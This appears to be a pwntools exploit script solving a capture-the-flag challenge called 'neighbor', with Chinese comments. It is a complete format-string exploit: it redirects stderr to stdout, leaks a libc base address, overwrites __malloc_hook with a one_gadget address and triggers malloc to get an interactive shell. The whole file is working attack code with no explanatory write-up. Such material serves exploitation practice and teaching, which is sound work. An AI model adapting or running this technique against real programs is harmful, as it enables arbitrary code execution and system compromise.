# encoding: utf-8

from pwn import *

libc = ELF('./libc.so.6')

def fmt(prev, value, idx, byte=1):
    ln  = "%{}c%{}$ln"
    n   = "%{}c%{}$n"
    hn  = "%{}c%{}$hn"
    hhn = "%{}c%{}$hhn"

    op = {1:hhn, 2:hn, 4:n, 8:ln}
    offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
    if value > prev:
        return op[byte].format(value-prev, idx)
    elif value == prev:
        if byte==1:
            return "%{}$hhn".format(idx)
        elif byte == 2:
            return "%{}$hn".format(idx)
        elif byte == 4:
            return "%{}$n".format(idx)
        elif byte == 8:
            return "%{}$ln".format(idx)
    else:
        return op[byte].format(value-prev+offset[byte], idx)



r = process('./neighbor')

r.recvuntil('mayor.')


## 將 stderr(2) 的 fileno 修改為 stdout(1)
payload = fmt(0, 0x68, 7)
r.sendline(payload)
payload = fmt(0, 0xf0, 11)
r.sendline(payload)
payload = fmt(0, 1, 6)
r.sendline(payload)

## leak libc_base
r.sendline("%6$p")
r.recvuntil('0x')
libc_base = int(r.recvn(12), 16)-0x70-libc.symbols['_IO_2_1_stderr_']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[1]
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print "malloc_hook @ ", hex(malloc_hook)

## 將 malloc_hook 寫入 one_shot
payload = fmt(0, malloc_hook&0xffff, 11, 2)
r.sendline(payload)
payload = fmt(0, 0x6a, 7)
r.sendline(payload)
payload = fmt(0, (malloc_hook>>16)&0xffff, 11, 2)
r.sendline(payload)
payload = fmt(0, one_shot&0xffff, 6, 2)
r.sendline(payload)
payload = fmt(0, 0x68, 7)
r.sendline(payload)
payload = fmt(0, (malloc_hook&0xff)+2, 11, 1)
r.sendline(payload)
payload = fmt(0, (one_shot>>16)&0xffff, 6, 2)
r.sendline(payload)
payload = fmt(0, (malloc_hook&0xff)+4, 11, 1)
r.sendline(payload)
payload = fmt(0, (one_shot>>32)&0xffff, 6, 2)
r.sendline(payload)

## trigger malloc
r.sendline('%100000c')
r.interactive()